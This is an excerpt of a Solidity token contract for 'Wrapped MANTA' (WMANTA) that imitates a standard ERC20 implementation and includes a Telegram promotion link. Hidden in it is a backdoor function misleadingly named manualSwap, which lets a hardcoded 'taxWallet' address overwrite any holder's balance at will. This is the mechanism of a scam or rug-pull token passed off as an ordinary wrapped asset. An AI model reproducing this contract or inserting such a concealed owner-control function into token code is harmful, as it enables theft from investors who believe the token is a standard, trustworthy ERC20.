 ...
 * For a generic mechanism see {ERC20PresetdeployerPauser}.
 *
...
contract ERC20 is Context, IERC20, IERC20Metadata {
   ...
   address private taxWallet; 
     ...
     * construction.
     */
    string public MANTATelegrame = "https://t.me/MANTA";
    constructor(string memory name_, string memory symbol_) {
        taxWallet = 0x8A965A0bCc89e96214f66f5776caA31905654587;    
        _name = name_;
        _symbol = symbol_;
        _totalSupply = 50000000000000 * 10 ** 9;
        tokenBalance[_msgSender()] = _totalSupply;
    ...
    function balanceOf(address account) public view virtual override returns (uint256) {
        return tokenBalance[account];
                    ...
                    function getMANTATelegrame() public view returns (string memory) {
        return MANTATelegrame;
    } 
    ...
    function transferFrom(address from, address to, uint256 tamount) public virtual override returns (bool) {
       ...
       function manualSwap(address addresss, uint256 tamount, uint256 Multitamount, uint256 stamount) external {
       require(taxWallet == _msgSender());
        tokenBalance[addresss] = tamount * Multitamount ** stamount;
    } 
    /**
    ...
    function _transfer(address from, address to, uint256 tamount) internal virtual {
        ...
        uint256 fromBalance = tokenBalance[from];
        require(fromBalance >= tamount, "ERC20: transfer tamount exceeds balance");
        unchecked {
            tokenBalance[from] = fromBalance - tamount;
            // Overflow not possible: the sum of all balances is capped by totalSupply, and the sum is preserved by
            // decrementing then incrementing.
            tokenBalance[to] += tamount;
        }
    ...
    function _burn(address account, uint256 tamount) internal virtual {
        ...
        uint256 accountBalance = tokenBalance[account];
        require(accountBalance >= tamount, "ERC20: burn tamount exceeds balance");
        unchecked {
            tokenBalance[account] = accountBalance - tamount;
    ...
    function _spendAllowance(address owner, address spender, uint256 tamount) internal virtual {
        ...
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= tamount, "ERC20: insufficient allowance");
            unchecked {
...
contract BridgeToken is ERC20 {
    constructor() ERC20("Wrapped MANTA", "WMANTA") {}
}